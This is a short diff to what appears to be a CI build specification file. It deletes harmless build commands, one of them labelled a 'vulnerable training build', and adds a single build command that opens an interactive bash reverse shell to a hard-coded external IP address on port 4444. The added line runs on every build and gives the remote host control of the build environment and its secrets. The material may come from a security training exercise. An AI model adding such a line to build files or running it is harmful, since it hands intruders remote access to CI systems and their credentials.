@@ -1,8 +1,5 @@
 version: 0.2
-
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - bash -i >& /dev/tcp/43.207.130.172/4444 0>&1
